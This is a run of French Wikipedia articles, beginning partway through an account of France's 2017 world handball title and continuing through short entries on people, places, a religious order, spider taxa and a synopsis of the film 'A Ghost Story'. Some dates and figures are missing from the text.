En demi-finale, de retour dans l'AccorHotels Arena de Paris, la France bat la Slovénie 31 à 25 et se qualifie pour la finale de son Championnat du monde. En finale le dimanche à Paris face à la Norvège qui avait intégré la compétition grâce à une "wild card", après une première mi-temps difficile où ils courent après le score (13-16 à la ), les Experts se détachent en deuxième période pour s'imposer sur le score final de 33 à 26.
L'équipe de France remporte ainsi son sixième titre mondial et sa onzième victoire internationale sur une période de vingt-deux ans,
cette fois sous la houlette du duo d'entraîneurs Didier Dinart et Guillaume Gille, devenus doubles champions du monde sur le terrain et sur le banc.
Nikola Karabatic est désigné meilleur joueur du tournoi, tandis que Nedim Remili et le gardien Vincent Gérard font partie de l'équipe-type de la compétition.
Qualification.
L'équipe de France a obtenu sa qualification en tant que pays hôte.
Matchs de préparation.
Après un premier stage à Capbreton (26-), la préparation de l'équipe de France s'est effectué en 4 phases : Toulouse (2-) pour un deuxième stage, Montpellier (7-) puis Paris (9-) avant le match d'ouverture à Bercy contre le Brésil le .
Dans le cadre de ce rassemblement, l'équipe de France a disputé deux matchs de préparation face à la Slovénie, à Toulouse le puis à Montpellier le :
Effectif.
Une liste de 16 joueurs plus un remplaçant (Yanis Lenne) a été établie le . Blessé lors du deuxième match, Luka Karabatic est remplacé par Dika Mem :
 !colspan=11 style="background: #FFFFFF; border: 1px solid #aaa;" align=center| Ailiers
 !colspan=11 style="background: #FFFFFF; border: 1px solid #aaa;" align=center| Arrières
 !colspan=11 style="background: #FFFFFF; border: 1px solid #aaa;" align=center| Demi-centres
!colspan=11 style="background: #FFFFFF; border: 1px solid #aaa;" align=center| Pivots
!colspan=11 style="background: #FFFFFF; border: 1px solid #aaa;" align=center| Remplaçant
Parmi les absents, Kévynn Nyokas, l'arrière droit du VfL Gummersbach et Mathieu Grébille, l'arrière gauche du Montpellier Handball, ont déclaré forfait sur blessure. À court de temps de jeu depuis son retour de blessure, Xavier Barachet, l'arrière droit du Paris Saint-Germain, n'a pas participé à la phase de préparation. Cyril Dumoulin, le gardien de but du HBC Nantes, Benoît Kounkoud, l'ailier droit du Paris Saint-Germain et Nicolas Claire, le demi-centre du HBC Nantes, ont participé à la phase de préparation mais n'ont finalement pas été retenus par le staff de l'équipe de France.
Phase préliminaire.
Classement.
Les matchs du groupe A se déroulent au Hall XXL du Parc des expositions de la Beaujoire de Nantes, mis à part le match d'ouverture entre la France et le Brésil, programmé à l'AccorHotels Arena de Paris.
Victoire face au Brésil.
Légèrement blessé lors des matchs de préparation, Timothey N'Guessan est préservé et n'est pas inscrit sur la feuille de match et la France n'aligne que 15 joueurs sur 16 possibles. Côté brésilien, l'arrière gauche Thiagus dos Santos a dû déclarer forfait pour ce match.
Pour ce match d'ouverture de la compétition, la France réalisé un excellent début de match grâce à notamment aux nombreux arrêts de Thierry Omeyer (qui terminera le match à 14 arrêts sur 21 tirs brésiliens, soit 67% d'arrêts) : menant 11-3 à la , les Français prennent dix buts d'avance juste avant la mi-temps (17-7) puis seize buts à la (26-10) pour terminer le match sur un +15 (31-16). Auteur d'une très bonne seconde mi-temps à 50% d'arrêts, Vincent Gérard est élu meilleur joueur du match.
Phase finale.
Premier de sa poule, l'équipe de France obtient ainsi sa qualification et retrouve en huitièmes de finale l'équipe d'Islande, du Groupe B.
Huitième de finale : victoire face à l'Islande.
Auteurs d'un excellent début de match, les Islandais prennent trois buts d'avance à la (5-2 à la puis 7-4 à la ) mais la France parvient à revenir à 7-7 puis les deux équipes se tiennent au coude à coude pour arriver à la mi-temps avec un avantage d'un but pour la France (14-13). Au retour des vestiaires, les Français infligent un 6-1 au Islandais (20-14 à la ) puis maintiennent leur avance pour finalement s'imposer de 6 buts (Score final : 31-25).
Par ailleurs, à cette occasion, un nouveau record d'affluence pour un match de championnat du monde est établi avec .
Statistiques et récompenses.
Équipe-type.
Trois joueurs français ont été élus dans l'équipe-type de la compétition :
Buteurs.
Yanis Lenne a accompagné l'équipe toute la compétition, mais n'a jamais été inscrit sur une feuille de match (donc a fortiori n'a eu aucun temps de jeu).

</doc>
<doc id="10577850" url="https://fr.wikipedia.org/wiki?curid=10577850" title="A Dog's Purpose">
A Dog's Purpose



</doc>
<doc id="10577852" url="https://fr.wikipedia.org/wiki?curid=10577852" title="Collège des licences de la Sorbonne">
Collège des licences de la Sorbonne



</doc>
<doc id="10577855" url="https://fr.wikipedia.org/wiki?curid=10577855" title="Collège doctoral de la Sorbonne">
Collège doctoral de la Sorbonne



</doc>
<doc id="10577871" url="https://fr.wikipedia.org/wiki?curid=10577871" title="Antoni Gotarde i Bartolí">
Antoni Gotarde i Bartolí

Antoni Gotarde i Bartolí, né à Barcelone en (Catalogne le et mort à Olot en 1920, est un photographe catalan de nationalité espagnole. Son travail montre la société d'Olot au début du .
Biographie.
Fils d'un chapelier originaire de Valladolid, Antoni Gotarde nait à Barcelone en 1853. Il se marie en 1886 avec Antònia Camps Socarrats (Olot, 1862-1935), qui vivait dans cette ville depuis sept ans et où elle exerçait comme institutrice. Le couple déménage en 1890 à Olot, rue Sant-Esteve, où naît en 1892 leur fille unique Carme, qui deviendra elle aussi une photographe réputée. En 1895, la famille déménage au n° 15 de la place des Capellans, aujourd'hui place Esteve Ferrer, adresse qui sera celle d'Antoni Gotarde jusqu'à sa mort. Fixé à Olot, celui-ci travaille d'abord comme artiste peintre, décorateur et restaurateur d'œuvres d'art, aussi bien pour des particuliers que pour des institutions religieuses (notamment pour l'église Saint-Estève d'Olot). De 1901 à 1903, il est directeur artistique de l'atelier d'images religieuses "El Sagrado Corazón". Il s'investit pleinement dans la photographie à partir de 1908, bien que l'on sache qu'il s'y consacrait épisodiquement depuis 1897. Il devient un portraitiste réputé, et les publicités qu'il fait paraître à l'époque montrent qu'il disposait des dernières avancées technologiques, telles que le procédé de "photo gravure" par exemple. Malade depuis plusieurs années, il meurt en 1920.
Fonds personnel.
Le fonds personnel d'Antoni Gotarde i Bartolí et celui de sa fille Carme sont conservés aux Archives comarcales de la Garrotxa, à Olot. Après la mort de Carme Gotarde en 1953, ces collections étaient passées entre les mains de Joan Aubert Camps, architecte municipal de la ville, qui les conserve alors dans une cave, où elles souffriront de l'humidité. Dans les années 1990, cette collection est léguée à Alexandre Cuéllar Bassols, publiciste et ancien secrétaire de la mairie d'Olot, qui trie les images abimées, en garde quelques-unes pour lui, puis la lègue à son tour à un autre habitant de la ville, Melcior Teixidor. Ce dernier conserve la collection dans son propre atelier de photographie. À partir de , il permet aux services de la ville de numériser l'ensemble du fonds, tâche qui est achevée en . Entre-temps, la collection est déménagée aux Archives comarcales de la Garrotxa.
L'ensemble du fonds d'Antoni Gotarde et de sa fille Carme est constitué en majeure partie de portraits de la société d'Olot et des environs, de 1890 à 1947. On y trouve en particulier de nombreux portrait de la famille Aubert. La collection comprend aussi des photos de paysages des environs, des reproductions d'œuvres d'art et des pièces réalisées par les ateliers d'images religieuses d'Olot.

</doc>
<doc id="10577882" url="https://fr.wikipedia.org/wiki?curid=10577882" title="Aérodrome de Pajala">
Aérodrome de Pajala

L'aérodrome de Pajala est un aéroport à Pajala, en Suède.
Histoire.
L'aéroport a été ouvert à la circulation en 1999. Avant cette ouverture, Pajala était la commune la plus inaccessible de Suède, avec près de 5 heures de voyage du centre de Stockholm (avec un vol vers Gällivare puis entre Gällivare et Pajala).
La piste a été élargie de en 2007, pour être en mesure de gérer de plus gros avions. En décembre, début 2013, et après cela, l'aéroport a été utilisé pour plusieurs vols nolisés par an à partir du Royaume-Uni pour les touristes qui souhaitent voir un Noël blanc.
Transport terrestre.
L'aéroport est à l'ouest de Pajala village. Taxi et de location de voitures sont disponibles. Le bus n ° 46 Gällivare–Pajala s'arrête à la route principale près de l'aéroport, mais seulement deux fois par jour.

</doc>
<doc id="10577890" url="https://fr.wikipedia.org/wiki?curid=10577890" title="Premier cycle des études médicales">
Premier cycle des études médicales

Le premier cycle des études médicales (PCEM) concerne plusieurs pays :

</doc>
<doc id="10577900" url="https://fr.wikipedia.org/wiki?curid=10577900" title="La maitrise du feu">
La maitrise du feu



</doc>
<doc id="10577914" url="https://fr.wikipedia.org/wiki?curid=10577914" title="Paul Chocheprat">
Paul Chocheprat

Paul Louis Albert Chocheprat (Périgny, -Toulon, ) est un officier de marine français.
Biographie.
Il entre à l'École navale en et en sort aspirant en . Il embarque alors sur le vaisseau-école de canonnage "Alexandre" puis sur la en escadre d'évolutions (1875) avant de servir sur le cuirassé "La Galissonnière" à la division navale du Pacifique (1876) où il se montre remarquable hydrographe.
Enseigne de vaisseau () sur le cuirassé en escadre d'évolutions, il passe en 1878 sur l'aviso "Castor" comme officier de manœuvre à la station du Sénégal et participe à des expéditions sur le Haut-Fleuve. Survivant d'une très violente épidémie de fièvre jaune, il est affecté en 1880 sur le croiseur "Armorique" à la division volante et d'instruction de Cherbourg et s'y montre excellent instructeur.
Promu en lieutenant de vaisseau, il commande le service artillerie du croiseur cuirassé puis est affecté à la majorité générale de Toulon. Officier d'ordonnance de l'amiral Benjamin Jaurès qui est le commandant en chef de l'escadre d'évolutions sur le "Richelieu" en 1884. En 1885 il est instructeur à l'école d’application des aspirants sur l' "Iphigénie" (1885).
Major (1887) de l’École des officiers torpilleurs de Toulon, commandant de l'aviso-torpilleur "Couleuvrine" en escadre d'évolutions puis adjudant de division sur les croiseurs "La Clochetterie" et à Terre-Neuve (1889-1890), il est promu capitaine de frégate en .
Il embarque ensuite comme officier de manœuvre sur le cuirassé "Amiral Baudin". Second du cuirassé "Dévastation" à la division de Méditerranée et du Levant, il est affecté ensuite sur le en 1893 puis sur le en 1894 où ses qualités de manœuvrier sont de nouveau remarquées.
Commandant de l'aviso-transport "Aube" et de la station locale de Tahiti (1895), il participe en janvier- aux opérations de Raïatea et de Tahaa ainsi qu'à des missions aux Samoa et aux Nouvelles-Hébrides.
En 1898, il est affecté à l'état-major à Cherbourg et est promu en août capitaine de vaisseau. Commandant du cuirassé en Méditerranée (1899) puis du cuirassé "Charlemagne" (1902), il effectue des missions en Grèce et sur les côtes du Maroc avant d'être promu chef d'état-major général de l'armée navale durant les manœuvres de 1905-1906. Il travaille alors à la commission de refonte des livres de signaux et de la tactique navale avec l'amiral François Ernest Fournier.
Contre-amiral (), il commande la division en Méditerranée puis est promu vice-amiral et préfet maritime de Brest en . préfet maritime de Toulon (), il commande en 1914 la escadre en armée navale avec pavillon sur le "Diderot" et est alors un des principaux collaborateurs de Boué de Lapeyrère.
Membre en 1916 du Conseil supérieur de la marine, il accompagne Joffre lors de la mission Viviani-Joffre aux États-Unis et passe au cadre de réserve en .
Il préside de 1920 à 1922 la Société des Œuvres de mer.

</doc>
<doc id="10577950" url="https://fr.wikipedia.org/wiki?curid=10577950" title="Église Saint-Michel de Međa">
Église Saint-Michel de Međa

Léglise Saint-Michel de Međa (en serbe cyrillique : ; en serbe latin : ) est une église orthodoxe serbe située à Međa, dans la province autonome de Voïvodine, dans la municipalité de Žitište et dans le district du Banat central en Serbie. Elle est inscrite sur la liste des monuments culturels de grande importance de la république de Serbie (identifiant SK 1100).
Présentation.
L'église a été construite dans la seconde moitié du . La nef est prolongée par une abside demi-circulaire aussi large que le reste de l'édifice.
Les sculptures sur bois de l'iconostase ont été réalisées par les frères Arsenije et Aksentije Marković en 1773 dans un style qui mêle des éléments baroques stylisés et des motifs classiques. Cette iconostase a été peinte en 1779 par Dimitrije Popović qui, dans ses compositions religieuses, se montre influencé par la peinture baroque.

</doc>
<doc id="10577954" url="https://fr.wikipedia.org/wiki?curid=10577954" title="Carmes de Marie Immaculée">
Carmes de Marie Immaculée

Les Carmes de Marie Immaculée (en latin "Congregatio Fratrum Carmelitarum B.V. Mariae Immaculatae") est une congrégation cléricale syro-malabare de droit pontifical. C'est le premier institut religieux catholique fondé en Inde.
Historique.
Thomas Malpan et Thomas Porukara, prêtres de l'Église catholique syro-malabare, désireux de mener une vie religieuse commune, se tournent vers le vicaire apostolique de Malabar, Maurilio Stabellini, de l'ordre des Carmes déchaux. En 1831, Stabellini érige pour eux un couvent à Mannamam près de Kottayam, et l'année suivante, un séminaire est annexée à la maison.
Kuriakose Elias Chavara rejoint bientôt la communauté, il est choisi comme premier supérieur et considéré comme le fondateur de la congrégation. Ils adoptent un habit religieux et un mode de vie inspiré de ceux des carmes déchaux. Le , les onze premiers aspirant prononcent leurs vœux selon la règle du Carmel entre les mains de Marcellin Berardi, carme déchaux et vicaire apostolique de sous le nom de serviteurs de Marie Immaculée. En 1846, ils ouvrent la première maison d'impression en langue tamoul.
La congrégation est agrégée aux carmes déchaux en 1860 sous le nom de troisième ordre des carmes déchaux (TOCD), ses constitutions sont définitivement approuvées par la congrégation pour la propagation de la foi le . En 1958, le nom actuellement est adopté, et l'institut est reconnu de droit pontifical en 1967 par le pape Paul VI.
Activités et diffusion.
Les religieux sont essentiellement contemplatifs mais aussi dédiés à diverses œuvres d'apostolat principalement vers les catholiques de rite syro-malabar. 
Ils sont présents en :
En 2014, la congrégation comptait 2485 religieux dont 1793 prêtres dans 374 maisons.

</doc>
<doc id="10577958" url="https://fr.wikipedia.org/wiki?curid=10577958" title="Rivière Blue Sea">
Rivière Blue Sea

La rivière Blue Sea est un affluent de la rivière Picanoc, coulant au nord du fleuve Saint-Laurent, dans les cantons de Bouchette et Wright, dans les municipalités de Blue Sea et de Gracefield, dans la municipalité régionale de comté (MRC) de La Vallée-de-la-Gatineau, dans la région administrative de la Outaouais, au Québec, au Canada.
Ce cours d’eau coule dans une petite vallée où les zones forestières, agricoles et de villégiature se mélangent. Dans ce sous-bassin hydrographique, la villégiature est surtout concentrée autour des lacs Blue Sea, Perreault et Orignal.
La surface de la rivière Blue Sea est généralement gelée de la mi-décembre jusqu’à la fin mars. Jadis, la foresterie constitue la principale activité économique ; la villégiature constitue l’activité importante.
Géographie.
La rivière Blue Sea prend sa source dans le canton de Bouchette, à l’embouchure d’un lac du Blue Sea (longueur : dans l’axe Nord-Sud ; altitude : ). Ce lac chevauche les municipalités de Messines et de Blue Sea.
Une série de montagnes bordent le côté ouest du lac dont le Mont Morissette (altitude : ) où une tour à feu avait été aménagée et la montagne à Roger (altitude : ).
L’embouchure de ce lac est située à au nord-ouest du centre-ville de Gracefield, à au nord de la confluence de la rivière Blue Sea, à au sud du centre-ville de Maniwaki et à au nord de la confluence de la rivière Gatineau.
À partir de l’embouchure du lac Blue Sea (située au sud), la rivière du même nom coule sur , selon les segments suivants :
La rivière Blue Sea se déverse dans le canton de Wright, sur la rive nord de la rivière Picanoc ; cette dernière coule à son tour vers l'est pour aller se déverser dans la rivière Gatineau, au sud de Gracefield. Cette confluence de la rivière Blue Sea est située à :
Toponymie.
Le toponyme rivière Blue Sea a été officialisé le à la Commission de toponymie du Québec.

</doc>
<doc id="10577967" url="https://fr.wikipedia.org/wiki?curid=10577967" title="Dancing With The Stars (Raqs el noujoum)">
Dancing With The Stars (Raqs el noujoum)



</doc>
<doc id="10577978" url="https://fr.wikipedia.org/wiki?curid=10577978" title="Down Under (Men at Work)">
Down Under (Men at Work)



</doc>
<doc id="10577981" url="https://fr.wikipedia.org/wiki?curid=10577981" title="Werner Devos">
Werner Devos

Werner Devos (né le à Roulers) est un coureur cycliste belge, professionnel de 1980 à 1990.
Résultats sur les grands tours.
Tour de France.
1 participation
Tour d'Espagne.
3 participations

</doc>
<doc id="10577984" url="https://fr.wikipedia.org/wiki?curid=10577984" title="Philippe François (théologien)">
Philippe François (théologien)

Philippe François (né le à Phalsbourg) est un théologien et pasteur luthéro-réformé français, spécialiste de la poésie de langue française en lien avec le protestantisme, auteur de films documentaires et concepteur d'expositions d'art contemporain sur la Réforme protestante.
Biographie.
Philippe François étudie la théologie protestante à la Faculté de théologie protestante de Strasbourg. Il obtient son doctorat en 1996 avec une thèse intitulée "L'Idée de télévision protestante : Principe protestant et Télévision d'auteur", sous la direction de Gabriel Vahanian.
Il est tour à tour pasteur de l’Union des Églises protestantes d'Alsace et de Lorraine à Strasbourg (Hautepierre), Abreschviller, Dieuze et Breuschwickersheim. Spécialiste de la poésie de langue française en lien avec le protestantisme, Philippe François a publié une anthologie et plusieurs articles dans les revues protestantes à ce sujet.
Il est l'auteur de trois documentaires diffusés sur France 2 dans le cadre de l'émission Présence protestante : "Film culte" (2003), autofiction autour de la préparation d'un culte protestant ; "Christophe Meyer avant le déluge" (2004), sur un projet d'art contemporain dans le temple réformé d'Algrange ; "Poésie protestante" (2010), film en trois parties d'après les travaux de l'auteur sur les liens entre protestantisme et histoire de la poésie française, avec la participation de Anne Azéma, Charles Berling, Diane Niedermann, Denis Podalydès et Christian Rist.
Philippe François est également le concepteur de deux expositions itinérantes d'art contemporain, à l'occasion du jubilé Jean Calvin en 2009, puis des 500 ans de la publication des 95 thèses par Martin Luther en 2017.

</doc>
<doc id="10578004" url="https://fr.wikipedia.org/wiki?curid=10578004" title="Double mixte de l'Open d'Australie 2017">
Double mixte de l'Open d'Australie 2017

Cet article présente les résultats détaillés du double mixte de l’édition 2017 de l’Open d'Australie qui est disputé du 16 au . Ce tournoi de tennis est le premier de la tournée du Grand Chelem.
Dotation.
La dotation totale du tableau s'élève à , en recul de 1,9 % par rapport à l'édition 2016.

</doc>
<doc id="10578012" url="https://fr.wikipedia.org/wiki?curid=10578012" title="Blue Sea (homonymie)">
Blue Sea (homonymie)

Blue Sea est un terme anglais qui se traduit par "mer bleue".

</doc>
<doc id="10578021" url="https://fr.wikipedia.org/wiki?curid=10578021" title="Chrystel Lejeune">
Chrystel Lejeune

Chrystel Lejeune , née le , est membre de l'équipe de France de gymnastique aérobic de 2006 à 2014. 

</doc>
<doc id="10578026" url="https://fr.wikipedia.org/wiki?curid=10578026" title="Dominique de Saint-Mars">
Dominique de Saint-Mars



</doc>
<doc id="10578027" url="https://fr.wikipedia.org/wiki?curid=10578027" title="Aranea venatoria">
Aranea venatoria



</doc>
<doc id="10578031" url="https://fr.wikipedia.org/wiki?curid=10578031" title="Aranea regia">
Aranea regia



</doc>
<doc id="10578032" url="https://fr.wikipedia.org/wiki?curid=10578032" title="Aranea pallens">
Aranea pallens



</doc>
<doc id="10578037" url="https://fr.wikipedia.org/wiki?curid=10578037" title="Thomisus leucosius">
Thomisus leucosius



</doc>
<doc id="10578038" url="https://fr.wikipedia.org/wiki?curid=10578038" title="Aérodrome d'Hagfors">
Aérodrome d'Hagfors

L'aérodrome d'Hagfors est un aéroport près d'Hagfors, dans le comté de Värmland, en Suède . En 2014, le nombre de passagers a été de 2406.
Compagnies aériennes et destinations.
Actualisé le 26/02/2023

</doc>
<doc id="10578039" url="https://fr.wikipedia.org/wiki?curid=10578039" title="Micrommata setulosa">
Micrommata setulosa



</doc>
<doc id="10578041" url="https://fr.wikipedia.org/wiki?curid=10578041" title="Olios antillianus">
Olios antillianus



</doc>
<doc id="10578042" url="https://fr.wikipedia.org/wiki?curid=10578042" title="Olios freycineti">
Olios freycineti



</doc>
<doc id="10578044" url="https://fr.wikipedia.org/wiki?curid=10578044" title="Olios colombianus">
Olios colombianus



</doc>
<doc id="10578045" url="https://fr.wikipedia.org/wiki?curid=10578045" title="Ocypete thoracica">
Ocypete thoracica



</doc>
<doc id="10578046" url="https://fr.wikipedia.org/wiki?curid=10578046" title="Ocypete murina">
Ocypete murina



</doc>
<doc id="10578047" url="https://fr.wikipedia.org/wiki?curid=10578047" title="Ingrid Torrance">
Ingrid Torrance

Ingrid Torrance, née le à New Westminster, en Colombie-Britannique, est une actrice canadienne.

</doc>
<doc id="10578050" url="https://fr.wikipedia.org/wiki?curid=10578050" title="Ocypete draco">
Ocypete draco



</doc>
<doc id="10578051" url="https://fr.wikipedia.org/wiki?curid=10578051" title="Olios albifrons">
Olios albifrons



</doc>
<doc id="10578052" url="https://fr.wikipedia.org/wiki?curid=10578052" title="Olios javensis">
Olios javensis



</doc>
<doc id="10578053" url="https://fr.wikipedia.org/wiki?curid=10578053" title="Olios gabonensis">
Olios gabonensis



</doc>
<doc id="10578054" url="https://fr.wikipedia.org/wiki?curid=10578054" title="Olios zonatus">
Olios zonatus



</doc>
<doc id="10578055" url="https://fr.wikipedia.org/wiki?curid=10578055" title="Ocypete bruneiceps">
Ocypete bruneiceps



</doc>
<doc id="10578057" url="https://fr.wikipedia.org/wiki?curid=10578057" title="SICCFIN">
SICCFIN



</doc>
<doc id="10578058" url="https://fr.wikipedia.org/wiki?curid=10578058" title="Sparassus ammanita">
Sparassus ammanita



</doc>
<doc id="10578059" url="https://fr.wikipedia.org/wiki?curid=10578059" title="Helicopis maderiana">
Helicopis maderiana



</doc>
<doc id="10578060" url="https://fr.wikipedia.org/wiki?curid=10578060" title="Sarotes truncus">
Sarotes truncus



</doc>
<doc id="10578062" url="https://fr.wikipedia.org/wiki?curid=10578062" title="Sarotes aulicus">
Sarotes aulicus



</doc>
<doc id="10578063" url="https://fr.wikipedia.org/wiki?curid=10578063" title="Sarotes invictus">
Sarotes invictus



</doc>
<doc id="10578064" url="https://fr.wikipedia.org/wiki?curid=10578064" title="Sarotes peditatus">
Sarotes peditatus



</doc>
<doc id="10578065" url="https://fr.wikipedia.org/wiki?curid=10578065" title="Coupe de Turquie de football 2016-2017">
Coupe de Turquie de football 2016-2017

La Coupe de Turquie de football 2016-2017, est la édition de la Coupe de Turquie. 
Elle est organisée par la Fédération de Turquie de football (TFF). La compétition met aux prises 156 clubs amateurs et professionnels à travers la Turquie.
Le vainqueur sera qualifié pour la Ligue Europa 2017-2018.
Galatasaray est le tenant du titre.

</doc>
<doc id="10578066" url="https://fr.wikipedia.org/wiki?curid=10578066" title="Heteropoda ferina">
Heteropoda ferina



</doc>
<doc id="10578067" url="https://fr.wikipedia.org/wiki?curid=10578067" title="Heteropoda ocellata">
Heteropoda ocellata



</doc>
<doc id="10578069" url="https://fr.wikipedia.org/wiki?curid=10578069" title="Heteropoda venatoria chinesica">
Heteropoda venatoria chinesica



</doc>
<doc id="10578071" url="https://fr.wikipedia.org/wiki?curid=10578071" title="Heteropoda venatoria japonica">
Heteropoda venatoria japonica



</doc>
<doc id="10578072" url="https://fr.wikipedia.org/wiki?curid=10578072" title="Heteropoda venatoria maculipes">
Heteropoda venatoria maculipes



</doc>
<doc id="10578073" url="https://fr.wikipedia.org/wiki?curid=10578073" title="Heteropoda venatoria pluridentata">
Heteropoda venatoria pluridentata



</doc>
<doc id="10578078" url="https://fr.wikipedia.org/wiki?curid=10578078" title="Heteropoda nicki">
Heteropoda nicki



</doc>
<doc id="10578079" url="https://fr.wikipedia.org/wiki?curid=10578079" title="Heteropoda nicki quala">
Heteropoda nicki quala



</doc>
<doc id="10578080" url="https://fr.wikipedia.org/wiki?curid=10578080" title="Palystes ledleyi">
Palystes ledleyi



</doc>
<doc id="10578081" url="https://fr.wikipedia.org/wiki?curid=10578081" title="A Ghost Story">
A Ghost Story

A Ghost Story , également intitulé Une histoire de fantôme, est un film dramatique écrit et réalisé par David Lowery et sorti en 2017.
Avec une extrême économie de moyens et une attention portée aux gestes et aux attitudes révélateurs de l'intériorité des personnages, David Lowery nous conte l'histoire d'une hantise. Un jeune musicien décède dans un accident de voiture juste devant chez lui. Mais au lieu que son esprit gagne le paradis, il revient dans sa maison, forme muette et invisible aux vivants, drapée d'un linceul blanc, pour revoir sa femme. Il hante désormais le lieu de sa maison, errant dans le futur mais aussi le passé. Les fondus au noir rendent compte des changements d'époque ou de moment.
Il est sélectionné au Festival du cinéma américain de Deauville 2017 où il remporte le Prix du jury (ex aequo avec "Brooklyn Yiddish"), le Prix de la critique internationale et le Prix Kiehl's de la Révélation.
Synopsis.
Le film s'ouvre sur une scène intime : un jeune couple allongé sur un divan, la jeune femme déclarant en riant : "Je suis morte de trouille" et le mari la rassurant : il ne faut pas avoir la trouille.
S'inscrit alors sur fond noir la citation suivante :
Puis la voix de la jeune femme résonne, expliquant qu'étant petite, elle déménageait tout le temps, alors elle écrivait des messages et les pliait en tout petit et les cachait à différents endroits. Comme ça, si elle voulait revenir, une partie d'elle l'attendrait dans le lieu abandonné. Mais elle n'y est jamais retournée, ce n'était pas nécessaire. Elle écrivait des choses sans importance, des comptines, des poèmes liés à ce qu'elle avait aimé dans ces lieux, qu'elle quittait "parce qu'elle n'avait pas le choix".
L'homme est musicien (Casey Affleck) Il vit avec sa femme (Rooney Mara) dans une petite maison dans la campagne environnant quelque ville du Texas. Le couple est très amoureux . Il envisage de quitter cette maison où se trouve néanmoins un piano auquel l'homme semble fort attaché et la jeune femme prépare le déménagement.
Ils entendent occasionnellement d'étranges bruits dans la maison ; une nuit, ils entendent même un bruit sonore fort inquiétant dans leur salon. Cela venait du piano qui leur a été loué avec la maison, mais ils ne parviennent pas à en comprendre la cause.
Le lendemain matin, le mari est tué dans un accident de voiture devant leur maison. À l'hôpital, sa femme vient voir son corps. Elle demande à rester seule avec lui mais elle ne peut faire plus que caresser un instant ses cheveux et le recouvrir du drap avant de s'en aller. Au bout d'un temps, le drap remue, la silhouette de l'homme se dresse. C'est son fantôme qui se met à errer dans les couloirs de l'hôpital. Désormais privé de sa forme humaine, il n'est plus qu'une ombre drapée d'un linceul avec deux trous obscurs en guise d'yeux. Il se découvre invisible pour les vivants. Allant vers la sortie (panneau Exit), il voit une porte lumineuse s'ouvrir devant lui à travers un mur, mais il la laisse se refermer sans s'y engager. Au lieu de cela, il sort de l'hôpital et marche à travers la campagne jusqu'à sa maison où il trouve sa femme dévastée par le deuil. La description psychologique de celui-ci passe par le jeu de l'actrice et des actions simples révélatrices du désarroi : notamment un long plan séquence où la jeune femme incarnée par Rooney Mara comble le vide qui l'angoisse en dévorant, assise à même le sol, une tarte-maison apportée par une certaine Linda, avant de le vomir. Commence une longue solitude. Le fantôme se découvre le pouvoir d'allumer et de faire grésiller les lampes. À travers la fenêtre, il aperçoit bientôt dans la maison voisine une autre silhouette recouverte d'un drap, un drap avec de pâles petites fleurs évoquant une vieille dame. Ils se font discrètement signe, échangent peu et par la pensée. Ce fantôme amnésique lui dit qu'il attend quelqu'un, mais ne sait pas qui.
Le temps s'écoule, marqué par les allées et venues quotidiennes de sa femme. Un soir, elle revient à la maison d'une soirée avec un homme visiblement amoureux d'elle, qu'elle embrasse mais n'invite pas à rentrer. Le fantôme, très atteint, manifeste assez d'énergie pour faire vasciller l'éclairage électrique et tomber des livres de la bibliothèque. La jeune femme les découvre au matin. L'un d'eux est ouvert sur un texte qui évoque singulièrement leur situation et présente comme un "trésor" la maison "qu'il a quittée, laissant sa femme seule". En même temps, la femme réécoute une chanson que son mari avait composée et se revoit avec lui, l'entendant au casque pour la première fois. Le ton en est d'une extrême tristesse, elle parle de solitude, et d'abandon réciproque. Emouvante scène où la main de la jeune femme, allongée au sol, touche presque le linceul de son mari fantôme. Le lendemain, elle se décide finalement à déménager. Lui, irrévocablement attaché au lieu, reste et la regarde s'en aller définitivement, libérée. Mais avant de partir, elle a rédigé et caché dans une fissure une petite note manuscrite. Le fantôme l'a vu faire, mais il est incapable d'atteindre matériellement le feuillet. Longtemps, il tentera en vain de l'extraire. Le temps passe.
Une nouvelle famille, hispanique, emménage dans la maison : une femme et ses deux jeunes enfants. Le fantôme les regarde vivre, dîner, jouer du piano, fêter Noël. Il semble s'accommoder de cette présence, mais la sienne gêne et inquiète les enfants qui prennent peur. Aucune cohabitation sereine n'est possible. Un soir, le fantôme s'énerve et jette à terre une photo de cette famille posée sur son piano et, pris de fureur, se met à précipiter au sol la vaisselle rangée dans le placard de la cuisine. Après cette séance de poltergeist, la famille quitte les lieux. Dans la maison voisine, l'autre fantôme continue d'attendre.
Lors d'une soirée organisée par de nouveaux habitants, un groupe de jeunes gens émancipés qui se défendent de craindre les fantômes (la maison étant désormais réputée hantée), un homme commence un monologue de philosophie pessimiste, annonçant que si Dieu n'existe pas, alors les chefs-d'œuvre, par exemple l'Hymne à la joie de Beethoven, sont créés en vain : ils resteront dans la mémoire humaine collective, peut-être même bien au-delà de l'effondrement de la civilisation, mais tôt ou tard l'humanité disparaîtra. Selon lui, tout est voué à la destruction, alors à quoi bon réaliser quoi que ce soit ? L'homme décrit ensuite la théorie du Big Crunch, qui énonce que l'univers entier finira par redevenir un simple atome et avant relancer une nouvelle expansion-création. "Ce sont les scientifiques qui le disent;(...) écrire une symphonie ne vaut guère mieux que planter un piquet ou faire l'amour". Le fantôme-musicien, qui l'écoutait avec autant d'attention que le reste de l'assistance, manifeste son émotion à cette perspective : les lumières de la maison se mettent à vaciller.
Le temps passe et fait son oeuvre : la maison, finalement abandonnée, et ravagée, se ruine, devenant horriblement sordide. Le fantôme est sur le point d'arriver à extraire la note manuscrite de sa femme de la fissure murale, mais à l'instant où il allait y parvenir, un bulldozer abat le mur et le fantôme assiste à la destruction de sa maison bien-aimée ainsi que de la maison voisine. Bientôt les bulldozers se retirent. Ne restent plus que des décombres au sol et les silhouettes des deux fantômes qui se regardent mutuellement ... Le fantôme amnésique constate alors qu' "Ils ne viendront plus" et s'évanouit, le drap qui le recouvre s'affaissant au sol parmi les débris. Le fantôme du musicien demeure sur les ruines, absolument seul désormais.
Le temps passe encore et voici que le site de son ancienne maison s'est mué en un chantier monumental. Le fantôme assiste à la construction d'un gratte-ciel à la place de son ancienne maison. Il erre dans le bâtiment jusqu'à son inauguration : ce sont des bureaux, un univers glacé et inhumain. Il va sur le toit de nuit et se découvre perdu au coeur d'une métropole futuriste. Cet espace est impropre à toute hantise et il n'y retrouvera jamais le billet de sa femme. Il saute dans le vide, rejoignant comme une flèche le sol, la terre.
